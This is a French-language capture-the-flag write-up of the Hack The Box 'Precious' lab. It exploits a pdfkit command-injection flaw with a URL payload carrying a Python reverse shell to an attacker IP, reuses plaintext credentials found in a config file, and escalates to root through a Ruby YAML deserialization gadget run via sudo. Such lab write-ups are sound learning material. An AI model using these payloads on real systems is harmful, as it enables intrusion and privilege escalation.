---
id: 16158394977844qs27kgm6
title: Lab HTB Precious
published_at: 2023-02-20
tags: Linux , Sql injection , XXS
excerpt:
slug:
crosspostedOn: ''
crosspostLink: ''
coverImage: https://firebasestorage.googleapis.com/v0/b/portfolio-d3c7c.appspot.com/o/a11y-banner.png?alt=media&token=283cad1b-a4d7-43ce-b4d3-c60d062ec636
---
# Lab HTB Precious

![enter image description here](https://blog.qz.sg/content/images/size/w2000/2022/11/Precious.png)

## Scan Nmap

```
  nmap  10.10.11.189
```
result :
![](https://cdn.discordapp.com/attachments/148488238431076352/1077681134374236260/image.png)

Apres le scan je me suis diriger vers le Frontal web vus qu'il est ouvert

![]()


![](https://cdn.discordapp.com/attachments/148488238431076352/1077681367913074809/image.png)

Si je suis ce que me dit le site . Il faut que je donne un lien et sa vas envoyer un fichier sur mon serveur ou en tous cas ouvrir un page

Donc j'allume un serveur web en local sur ma Kali :
```py
python3 -m http.server 9999
```

J'ai obtenu un PDF

J'ai commancer a annalyser le contenu de ce fichier :
Generated by pdfkit v0.8.6

et apres j'ai effectuer une recherche google sur ce service

Et le premier resultat j'ai vus CVE de commande injection CVE-2022-25765

Bon bah go exploit cette faille - ref ce site https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

Si j'ai compris je peut inject un commnde directement dans l'url que je vais drop la page web http://127.0.0.1:80/?name=%20
reverse shell ici je pence

reverse shell generator pour la generation du reverce TCP


```py
http://127.0.0.1:80/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16. 70",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`

```
plus l'ecoute

```
  nc -lvnp 4444
```


BIM session ouverte

2 utilisateur trouver :
  Henry
  ruby

En cherchant dans l'arboressance j'ai trouver un fichier de conf avec les creds de henry
go ce connecter en SSH

contenu du fichier
```
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

![](https://cdn.discordapp.com/attachments/148488238431076352/1077683831366221925/image.png)

 premier flag

## Privil√®ge elevation

execution de linPEAS :  https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

l'information la plus utile pour la suite  
![](https://cdn.discordapp.com/attachments/148488238431076352/1077684778943397948/image.png)
 je suis aller voir ce fichier

![](https://cdn.discordapp.com/attachments/148488238431076352/1077685148021162065/image.png)
et en regardent les droit de ce fichier il a les droit 777 soit root . ( Je crois que je suis sur la bonne voix )
et j ai vus qu'il executer le fichier dependance.yml :

![](https://cdn.discordapp.com/attachments/148488238431076352/1077686086991626320/image.png)

et la on peut voir une commande systeme qui est executer , il manque plus cas executer la commande voulu et hop root

ref :
https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/
payload : https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565


modif du fichier yaml
```yaml
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system  "COMMANDE ICI " ( cat /root/root.txt)
             git_set: id
         method_id: :resolve

```

mise a jour :
```
Sudo /usr/bin/ruby /opt/update_dependencies
```

le flag s'affiche c'est gagner :
![](https://cdn.discordapp.com/attachments/148488238431076352/1077687101761531964/image.png)
